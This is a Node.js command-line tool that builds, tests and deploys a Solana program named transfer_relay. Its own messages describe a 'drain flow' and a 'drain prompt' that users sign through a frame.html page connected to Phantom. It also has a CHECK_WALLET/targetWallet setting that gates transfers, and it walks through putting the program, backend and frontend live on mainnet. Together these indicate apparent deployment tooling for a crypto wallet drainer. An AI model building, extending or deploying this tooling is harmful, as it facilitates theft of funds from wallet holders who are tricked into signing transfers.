#!/usr/bin/env node
/**
 * relay.js — On-chain program CLI
 *
 * Build, test on localnet, deploy the transfer_relay Solana program.
 * On Windows it uses WSL automatically. On Linux it runs natively.
 *
 * Run:  node relay.js
 */

import fs from "fs";
import path from "path";
import readline from "readline";
import { execSync, spawn } from "child_process";

const ROOT = process.cwd();
const cfgPath = path.join(ROOT, "deploy.config.json");

// ── ANSI colors ──────────────────────────────────────────────────────────────
const c = {
  reset:"\x1b[0m",bold:"\x1b[1m",dim:"\x1b[2m",red:"\x1b[31m",green:"\x1b[32m",
  yellow:"\x1b[33m",blue:"\x1b[34m",magenta:"\x1b[35m",cyan:"\x1b[36m",gray:"\x1b[90m",
};

// ── Helpers ──────────────────────────────────────────────────────────────────
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

function ask(q, d = "") {
  const h = d ? ` ${c.gray}[${d}]${c.reset}` : "";
  return new Promise(r => rl.question(`${c.cyan}?${c.reset} ${q}${h} ${c.dim}›${c.reset} `, a => r(a.trim() || d)));
}
function info(s)  { console.log(`  ${c.blue}ℹ${c.reset} ${c.gray}${s}${c.reset}`); }
function ok(s)    { console.log(`  ${c.green}✓${c.reset} ${s}`); }
function warn(s)  { console.log(`  ${c.yellow}⚠${c.reset} ${s}`); }
function err(s)   { console.log(`  ${c.red}✗${c.reset} ${s}`); }
function hdr(s)   { console.log(`\n${c.bold}  ▸ ${s}${c.reset}\n`); }

function loadCfg() {
  if (fs.existsSync(cfgPath)) { try { return JSON.parse(fs.readFileSync(cfgPath,"utf8")); } catch {} }
  return {};
}

const isWin = process.platform === "win32";
const isLin = process.platform === "linux";

function wslPath() {
  const m = ROOT.replace(/\\/g,"/").match(/^([A-Z]):(.*)/);
  return m ? `/mnt/${m[1].toLowerCase()}${m[2]}` : ROOT;
}

function wslRun(cmd, silent) {
  return execSync(`wsl -d Ubuntu -- bash -lc "${cmd.replace(/"/g,'\\"')}"`, {
    encoding:"utf8", stdio: silent ? "pipe" : "inherit"
  });
}
function wslRunAsync(cmd) {
  return new Promise(r => {
    const ch = spawn("wsl",["-d","Ubuntu","--","bash","-lc",cmd],{stdio:"inherit"});
    ch.on("close", r);
  });
}
function natRunAsync(cmd) {
  return new Promise(r => {
    const ch = spawn("bash",["-lc",cmd],{stdio:"inherit"});
    ch.on("close", r);
  });
}

function checkWSL() {
  try {
    const buf = execSync("wsl -l -v",{encoding:"buffer"});
    const out = buf.toString("utf16le").replace(/\0/g,"");
    return out.toLowerCase().includes("ubuntu");
  } catch { return false; }
}

function checkToolchain(wsl) {
  const tools = ["solana","anchor","cargo","node"];
  const missing = [];
  for (const t of tools) {
    try {
      if (wsl) wslRun(`which ${t}`, true);
      else execSync(`which ${t}`, {encoding:"utf8",stdio:"pipe"});
    } catch { missing.push(t); }
  }
  return missing;
}

function getProgramId() {
  const t = fs.readFileSync(path.join(ROOT,"Anchor.toml"),"utf8");
  const m = t.match(/\[programs\.localnet\][\s\S]*?transfer_relay = "([^"]+)"/);
  return m ? m[1] : "4N7VSjZcko3khCPaSTKC242hv7PudYdyKcCdkzKXQvyg";
}

function patchProgramId(id) {
  let t = fs.readFileSync(path.join(ROOT,"Anchor.toml"),"utf8");
  t = t.replace(/transfer_relay = "[^"]+"/g, `transfer_relay = "${id}"`);
  fs.writeFileSync(path.join(ROOT,"Anchor.toml"), t);
  ok("Anchor.toml patched");

  let l = fs.readFileSync(path.join(ROOT,"programs/transfer-relay/src/lib.rs"),"utf8");
  l = l.replace(/declare_id!\("[^"]+"\)/, `declare_id!("${id}")`);
  fs.writeFileSync(path.join(ROOT,"programs/transfer-relay/src/lib.rs"), l);
  ok("lib.rs declare_id! patched");

  const cj = path.join(ROOT,"server/config.js");
  if (fs.existsSync(cj)) {
    let s = fs.readFileSync(cj,"utf8");
    s = s.replace(/relayProgramId:\s*"[^"]+"/g, `relayProgramId: "${id}"`);
    fs.writeFileSync(cj, s);
    ok("server/config.js patched");
  }

  if (fs.existsSync(cfgPath)) {
    const cfg = JSON.parse(fs.readFileSync(cfgPath,"utf8"));
    cfg.relayProgramId = id;
    fs.writeFileSync(cfgPath, JSON.stringify(cfg,null,2)+"\n");
    ok("deploy.config.json patched");
  }
}

function patchCheckWallet(w) {
  let l = fs.readFileSync(path.join(ROOT,"programs/transfer-relay/src/lib.rs"),"utf8");
  l = l.replace(/CHECK_WALLET: Pubkey = pubkey!\("[^"]+"\)/, `CHECK_WALLET: Pubkey = pubkey!("${w}")`);
  fs.writeFileSync(path.join(ROOT,"programs/transfer-relay/src/lib.rs"), l);
  ok("lib.rs CHECK_WALLET patched");
}

// ── Build commands ──────────────────────────────────────────────────────────
const buildCmd = p => [
  `source ~/.profile 2>/dev/null; source ~/.cargo/env 2>/dev/null`,
  `sed -i 's/^version = 4$/version = 3/' "${p}/Cargo.lock" "${p}/programs/transfer-relay/Cargo.lock" 2>/dev/null || true`,
  `cd "${p}" && anchor build --no-idl`,
].join(" && ");

const deployLocal = p => {
  const so = `${p}/programs/transfer-relay/target/deploy/transfer_relay.so`;
  const kp = `${p}/target/deploy/transfer_relay-keypair.json`;
  return [
    `source ~/.profile 2>/dev/null; source ~/.cargo/env 2>/dev/null`,
    `solana config set --url localhost`,
    `[ -f ~/.config/solana/id.json ] || solana-keygen new --no-bip39-passphrase --silent -o ~/.config/solana/id.json`,
    `solana airdrop 100 --url localhost 2>/dev/null || true`,
    `solana program deploy "${so}" --program-id "${kp}" --url localhost`,
  ].join(" && ");
};

const deployMain = p => {
  const so = `${p}/programs/transfer-relay/target/deploy/transfer_relay.so`;
  const kp = `${p}/target/deploy/transfer_relay-keypair.json`;
  return [
    `source ~/.profile 2>/dev/null; source ~/.cargo/env 2>/dev/null`,
    `solana config set --url mainnet-beta`,
    `solana program deploy "${so}" --program-id "${kp}" --url mainnet-beta`,
  ].join(" && ");
};

const validatorCmd = p => [
  `source ~/.profile 2>/dev/null; source ~/.cargo/env 2>/dev/null`,
  `mkdir -p "${p}/.localnet"`,
  `cd "${p}/.localnet" && exec solana-test-validator --reset`,
].join(" && ");

const testCmd = p => [
  `source ~/.profile 2>/dev/null; source ~/.cargo/env 2>/dev/null`,
  `cd "${p}" && yarn run ts-mocha -p ./tsconfig.json -t 1000000 tests/**/*.ts`,
].join(" && ");

function verifyBinary(p) {
  const script = `python3 - <<'PY'
import json
kp = json.load(open("${p}/target/deploy/transfer_relay-keypair.json"))
pub = bytes(kp[32:64])
data = open("${p}/programs/transfer-relay/target/deploy/transfer_relay.so","rb").read()
print("OK" if pub in data else "FAIL")
PY`;
  try {
    const o = isWin ? wslRun(script, true) : execSync(script,{encoding:"utf8"});
    return o.trim() === "OK";
  } catch { return false; }
}

// ════════════════════════════════════════════════════════════════════════════
// MAIN
// ════════════════════════════════════════════════════════════════════════════
async function main() {
  console.log(`
${c.magenta}${c.bold}╔══════════════════════════════════════════════════╗${c.reset}
${c.magenta}${c.bold}║  RELAY — On-Chain Program CLI                    ║${c.reset}
${c.magenta}${c.bold}║  Build · Test · Deploy the Solana program        ║${c.reset}
${c.magenta}${c.bold}╚══════════════════════════════════════════════════╝${c.reset}
${c.gray}  Detecting platform...${c.reset}
`);

  let useWSL = false;
  let P = ROOT;

  if (isWin) {
    info("Platform: Windows — using WSL for builds");
    if (!checkWSL()) {
      err("WSL Ubuntu not found. Install: wsl --install -d Ubuntu");
      process.exit(1);
    }
    useWSL = true;
    P = wslPath();
    ok(`WSL Ubuntu running. Project: ${P}`);

    const missing = checkToolchain(true);
    if (missing.length) {
      warn(`Missing in WSL: ${missing.join(", ")}`);
      console.log(`  ${c.dim}Install inside WSL Ubuntu:${c.reset}`);
      console.log(`  ${c.dim}  sh -c "$(curl -sSfL https://release.solana.com/stable/install)"${c.reset}`);
      console.log(`  ${c.dim}  npm i -g @coral-xyz/anchor-cli${c.reset}`);
      console.log(`  ${c.dim}  curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh${c.reset}`);
      const cont = await ask("Continue anyway?", "no");
      if (!cont.startsWith("y")) process.exit(0);
    } else {
      ok("WSL toolchain: solana + anchor + cargo + node ✓");
    }
  } else if (isLin) {
    info("Platform: Linux — building natively");
    const missing = checkToolchain(false);
    if (missing.length) {
      warn(`Missing: ${missing.join(", ")}`);
      const cont = await ask("Continue anyway?", "no");
      if (!cont.startsWith("y")) process.exit(0);
    } else {
      ok("Native toolchain: all present ✓");
    }
  } else {
    err("macOS/other — Solana BPF builds need Linux or WSL.");
    info("Use a Linux VM or SSH into a Linux box.");
    process.exit(1);
  }

  const cfg = loadCfg();
  const pid = getProgramId();

  console.log(`
${c.bold}  Program ID:${c.reset}   ${c.cyan}${pid}${c.reset}
${c.bold}  Check wallet:${c.reset} ${c.cyan}${cfg.checkWallet || "(not set)"}${c.reset}
`);
  const action = await ask(
    `Action?\n${c.dim}  1${c.reset} Build & test on localnet (recommended first)\n${c.dim}  2${c.reset} Deploy to mainnet\n${c.dim}  3${c.reset} Generate new program keypair + patch files\n${c.dim}  4${c.reset} Update CHECK_WALLET in the program\n${c.dim}  5${c.reset} Just build (no deploy)\n`,
    "1"
  );

  switch (action) {
    case "1": await flowLocal(useWSL, P, cfg); break;
    case "2": await flowMain(useWSL, P, cfg); break;
    case "3": await flowKeypair(useWSL, P); break;
    case "4": await flowCheckWallet(); break;
    case "5": await flowBuild(useWSL, P); break;
    default:  await flowLocal(useWSL, P, cfg); break;
  }
  rl.close();
}

// ════════════════════════════════════════════════════════════════════════════
// FLOW: LOCALNET
// ════════════════════════════════════════════════════════════════════════════
async function flowLocal(useWSL, P, cfg) {
  hdr("LOCALNET BUILD & TEST");

  // 1. Validator
  console.log(`${c.bold}  [1/5] Local validator${c.reset}`);
  info("A local Solana validator must be running for the deploy.");
  const start = await ask("Start a validator in a new window now?", "yes");
  if (start.startsWith("y")) {
    if (isWin) {
      spawn("cmd",["/c","start","Solana Validator","wsl","-d","Ubuntu","--","bash","-lc",validatorCmd(P)],
        {detached:true,stdio:"ignore"}).unref();
    } else {
      spawn("gnome-terminal",["--","bash","-lc",validatorCmd(P)],{detached:true,stdio:"ignore"}).unref();
    }
    ok("Validator starting...");
    info("Waiting 8s for boot...");
    await new Promise(r => setTimeout(r, 8000));
  }

  // 2. Check validator
  console.log(`\n${c.bold}  [2/5] Checking validator${c.reset}`);
  let up = false;
  try {
    if (useWSL) wslRun("solana config set --url localhost >/dev/null 2>&1 && solana cluster-version 2>/dev/null", true);
    else execSync("solana config set --url localhost >/dev/null 2>&1 && solana cluster-version 2>/dev/null",{stdio:"pipe"});
    up = true;
  } catch {}
  if (!up) {
    err("Validator not reachable on localhost:8899");
    info("Start manually:");
    if (useWSL) console.log(`  ${c.dim}wsl -d Ubuntu -- bash -lc "${validatorCmd(P)}"${c.reset}`);
    else console.log(`  ${c.dim}${validatorCmd(P)}${c.reset}`);
    const r = await ask("Retry?", "yes");
    if (r.startsWith("y")) {
      await new Promise(r => setTimeout(r, 3000));
      try {
        if (useWSL) wslRun("solana cluster-version 2>/dev/null", true);
        else execSync("solana cluster-version 2>/dev/null",{stdio:"pipe"});
        up = true;
      } catch {}
    }
    if (!up) { err("Still not reachable. Aborting."); process.exit(1); }
  }
  ok("Validator running on localhost:8899");

  // 3. Build
  console.log(`\n${c.bold}  [3/5] Building (anchor build --no-idl)${c.reset}`);
  info("First build: 3-8 min. Cached rebuilds: ~30s.");
  const bc = useWSL ? await wslRunAsync(buildCmd(P)) : await natRunAsync(buildCmd(P));
  if (bc !== 0) {
    err("Build failed. Try: anchor clean && anchor build --no-idl");
    process.exit(1);
  }
  ok("Build complete");

  // 4. Deploy to localnet
  console.log(`\n${c.bold}  [4/5] Deploying to localnet${c.reset}`);
  if (verifyBinary(P)) ok("Program ID verified in .so");
  else warn("Couldn't verify ID in binary (ok on first build)");

  const dc = useWSL ? await wslRunAsync(deployLocal(P)) : await natRunAsync(deployLocal(P));
  if (dc !== 0) {
    err("Deploy failed. If 'account data too small':");
    info("  solana program extend <PROGRAM_ID> 60000 --url localhost");
    process.exit(1);
  }
  ok("Program deployed to localnet!");

  // 5. Tests
  console.log(`\n${c.bold}  [5/5] Integration tests${c.reset}`);
  info("Replays the drain flow with fake tokens — verifies balances.");
  const tc = useWSL ? await wslRunAsync(testCmd(P)) : await natRunAsync(testCmd(P));
  if (tc !== 0) warn("Test failures — try restarting validator + re-run");
  else ok("All tests passed!");

  // Phantom instructions
  console.log(`
${c.green}${c.bold}╔══════════════════════════════════════════════════╗${c.reset}
${c.green}${c.bold}║  LOCALNET READY — TEST WITH PHANTOM               ║${c.reset}
${c.green}${c.bold}╚══════════════════════════════════════════════════╝${c.reset}

${c.bold}  Phantom wallet testing:${c.reset}
${c.gray}  ─────────────────────────────────────────────────${c.reset}
  ${c.bold}1.${c.reset} Open Phantom → Settings → Developer → Network
  ${c.bold}2.${c.reset} Add custom RPC: ${c.cyan}http://localhost:8899${c.reset}
  ${c.bold}3.${c.reset} Create a burner wallet (NOT your real one)
  ${c.bold}4.${c.reset} Airdrop fake SOL:
     ${c.dim}solana airdrop 10 <burner-pubkey> --url localhost${c.reset}
  ${c.bold}5.${c.reset} Start backend on localnet:
     ${c.dim}cd server && RPC_ENDPOINT=http://localhost:8899 node server.js${c.reset}
  ${c.bold}6.${c.reset} Open frame.html in a browser
  ${c.bold}7.${c.reset} Connect Wallet → approve in Phantom
  ${c.bold}8.${c.reset} Sign the drain prompt ${c.yellow}(burner only!)${c.reset}
  ${c.bold}9.${c.reset} Verify on explorer:
     ${c.dim}https://explorer.solana.com/?cluster=custom&customUrl=http://localhost:8899${c.reset}

${c.gray}  When tests pass, deploy to mainnet:${c.reset}
     ${c.cyan}node relay.js${c.reset} ${c.dim}(choose option 2)${c.reset}
  ${c.gray}Need ~1.5 SOL for program rent on mainnet.${c.reset}
`);
}

// ════════════════════════════════════════════════════════════════════════════
// FLOW: MAINNET
// ════════════════════════════════════════════════════════════════════════════
async function flowMain(useWSL, P, cfg) {
  hdr("MAINNET DEPLOYMENT");

  // 1. Pre-flight
  console.log(`${c.bold}  [1/4] Pre-flight checks${c.reset}\n`);
  const pid = getProgramId();
  if (pid === "4N7VSjZcko3khCPaSTKC242hv7PudYdyKcCdkzKXQvyg") {
    warn("Using the original/reconstruction program ID.");
    info("For a real deploy, generate a new keypair (option 3) first.");
    const c2 = await ask("Continue with this ID?", "no");
    if (!c2.startsWith("y")) { info("Run: node relay.js (option 3)"); process.exit(0); }
  }

  // Check CHECK_WALLET sync
  const l = fs.readFileSync(path.join(ROOT,"programs/transfer-relay/src/lib.rs"),"utf8");
  const m = l.match(/CHECK_WALLET: Pubkey = pubkey!\("([^"]+)"/);
  const cw = m ? m[1] : "";
  if (cfg.checkWallet && cw && cw !== cfg.checkWallet) {
    warn(`CHECK_WALLET mismatch: lib.rs=${cw.slice(0,8)}... config=${cfg.checkWallet.slice(0,8)}...`);
    const fix = await ask("Update lib.rs to match config?", "yes");
    if (fix.startsWith("y")) patchCheckWallet(cfg.checkWallet);
  }

  // Balance
  info("Checking deployer balance on mainnet...");
  let bal = 0;
  try {
    const o = useWSL
      ? wslRun("source ~/.cargo/env 2>/dev/null; solana balance --url mainnet-beta 2>/dev/null", true)
      : execSync("solana balance --url mainnet-beta 2>/dev/null",{encoding:"utf8",stdio:"pipe"});
    bal = parseFloat(o) || 0;
  } catch { warn("Couldn't check balance."); }
  if (bal > 0) ok(`Deployer balance: ${bal} SOL`);
  else warn("Deployer has 0 SOL or no wallet configured.");

  if (bal < 2) {
    info("Need ~1.5 SOL for program rent + gas.");
    info("Your deployer address:");
    try {
      const a = useWSL
        ? wslRun("source ~/.cargo/env 2>/dev/null; solana address --url mainnet-beta 2>/dev/null", true).trim()
        : execSync("solana address --url mainnet-beta 2>/dev/null",{encoding:"utf8"}).trim();
      console.log(`  ${c.cyan}${a}${c.reset}`);
    } catch { info("  (run: solana address)"); }
    const c2 = await ask("Continue anyway?", "no");
    if (!c2.startsWith("y")) process.exit(0);
  }

  // 2. Build
  console.log(`\n${c.bold}  [2/4] Building for mainnet${c.reset}`);
  const bc = useWSL ? await wslRunAsync(buildCmd(P)) : await natRunAsync(buildCmd(P));
  if (bc !== 0) { err("Build failed."); process.exit(1); }
  ok("Build complete");
  if (verifyBinary(P)) ok("Program ID verified in .so");
  else { warn("ID not in binary — keypair may be stale."); }

  // 3. Confirm
  console.log(`\n${c.bold}  [3/4] Final confirmation${c.reset}\n`);
  console.log(`  Program ID:    ${c.cyan}${pid}${c.reset}`);
  console.log(`  Check wallet:  ${c.cyan}${cw || "(from lib.rs)"}${c.reset}`);
  console.log(`  Deployer:      ${c.cyan}${bal} SOL${c.reset}`);
  console.log(`  Network:       ${c.red}${c.bold}MAINNET-BETA${c.reset}\n`);
  info("This costs real SOL (~1.5 for rent) and is irreversible.");
  info("The program will be live and callable by anyone.");
  const sure = await ask("Deploy to mainnet? Type 'yes' to confirm", "no");
  if (sure !== "yes") { err("Aborted."); process.exit(0); }

  // 4. Deploy
  console.log(`\n${c.bold}  [4/4] Deploying to mainnet...${c.reset}`);
  const dc = useWSL ? await wslRunAsync(deployMain(P)) : await natRunAsync(deployMain(P));
  if (dc !== 0) {
    err("Deploy failed. Check:");
    info("  - Sufficient SOL balance");
    info("  - Correct program keypair (option 3 to regenerate)");
    info("  - Network: solana config set --url mainnet-beta");
    process.exit(1);
  }

  console.log(`
${c.green}${c.bold}╔══════════════════════════════════════════════════╗${c.reset}
${c.green}${c.bold}║  PROGRAM LIVE ON MAINNET                         ║${c.reset}
${c.green}${c.bold}╚══════════════════════════════════════════════════╝${c.reset}

${c.bold}  Next steps:${c.reset}
${c.gray}  ─────────────────────────────────────────────────${c.reset}
  ${c.bold}1.${c.reset} Verify: ${c.dim}solana program show ${pid} --url mainnet-beta${c.reset}
  ${c.bold}2.${c.reset} Update server config: ${c.dim}node setup.js${c.reset}
  ${c.bold}3.${c.reset} Deploy backend: ${c.dim}cd server && fly deploy${c.reset}
  ${c.bold}4.${c.reset} Deploy frontend: ${c.dim}cd server/public && vercel --prod${c.reset}
  ${c.bold}5.${c.reset} Test end-to-end with a burner wallet on mainnet
`);
}

// ════════════════════════════════════════════════════════════════════════════
// FLOW: NEW KEYPAIR
// ════════════════════════════════════════════════════════════════════════════
async function flowKeypair(useWSL, P) {
  hdr("NEW PROGRAM KEYPAIR");
  info("Generates a fresh keypair → extracts the pubkey → patches all files.");
  info("The keypair goes to: target/deploy/transfer_relay-keypair.json");
  info("A backup is saved too. Keep it safe — it IS the program's identity.\n");

  const gen = await ask("Generate new keypair?", "yes");
  if (!gen.startsWith("y")) process.exit(0);

  // Generate in WSL or native
  const keypairDir = `${P}/target/deploy`;
  const cmd = [
    `source ~/.profile 2>/dev/null; source ~/.cargo/env 2>/dev/null`,
    `mkdir -p "${keypairDir}"`,
    `solana-keygen new --no-bip39-passphrase --silent --outfile "${keypairDir}/transfer_relay-keypair.json"`,
    `solana-keygen pubkey "${keypairDir}/transfer_relay-keypair.json"`,
  ].join(" && ");

  let newId = "";
  try {
    const o = useWSL ? wslRun(cmd, true) : execSync(cmd,{encoding:"utf8"});
    newId = o.trim().split("\n").pop().trim();
  } catch { err("Failed to generate keypair."); process.exit(1); }

  if (!newId || newId.length < 32) { err("Invalid pubkey: " + newId); process.exit(1); }

  // Backup
  const backupCmd = `cp "${keypairDir}/transfer_relay-keypair.json" "${P}/transfer_relay-keypair.backup.json"`;
  try { useWSL ? wslRun(backupCmd, true) : execSync(backupCmd,{stdio:"pipe"}); } catch {}

  ok(`New program ID: ${newId}`);
  patchProgramId(newId);
  ok("Backup saved: transfer_relay-keypair.backup.json");

  console.log(`
${c.gray}  Rebuild with the new ID:${c.reset}
     ${c.cyan}node relay.js${c.reset} ${c.dim}(option 5 to build, or option 1 for full localnet)${c.reset}
`);
}

// ════════════════════════════════════════════════════════════════════════════
// FLOW: CHECK_WALLET UPDATE
// ════════════════════════════════════════════════════════════════════════════
async function flowCheckWallet() {
  hdr("UPDATE CHECK_WALLET");
  info("The CHECK_WALLET constant in lib.rs gates all transfers.");
  info("Only transactions passing this address are allowed by the program.\n");

  const l = fs.readFileSync(path.join(ROOT,"programs/transfer-relay/src/lib.rs"),"utf8");
  const m = l.match(/CHECK_WALLET: Pubkey = pubkey!\("([^"]+)"/);
  const cur = m ? m[1] : "(not found)";
  info(`Current CHECK_WALLET: ${cur}`);

  const cfg = loadCfg();
  const def = cfg.checkWallet || cfg.targetWallet || "";
  const nw = await ask("New CHECK_WALLET address:", def);
  if (!nw || nw.length < 32) { err("Invalid address."); process.exit(1); }
  patchCheckWallet(nw);

  console.log(`\n${c.gray}  Rebuild to apply:${c.reset}  ${c.cyan}node relay.js${c.reset} ${c.dim}(option 5)${c.reset}\n`);
}

// ════════════════════════════════════════════════════════════════════════════
// FLOW: BUILD ONLY
// ════════════════════════════════════════════════════════════════════════════
async function flowBuild(useWSL, P) {
  hdr("BUILD ONLY");
  info("Compiles Rust → BPF binary. No deploy, no validator needed.");
  const bc = useWSL ? await wslRunAsync(buildCmd(P)) : await natRunAsync(buildCmd(P));
  if (bc !== 0) { err("Build failed."); process.exit(1); }
  ok("Build complete");
  if (verifyBinary(P)) ok("Program ID verified in .so");
  else warn("ID not in binary (may need to rebuild after keypair change)");
  console.log(`\n${c.gray}  Binary: programs/transfer-relay/target/deploy/transfer_relay.so${c.reset}\n`);
}

main().catch(e => { err(e.message); process.exit(1); });
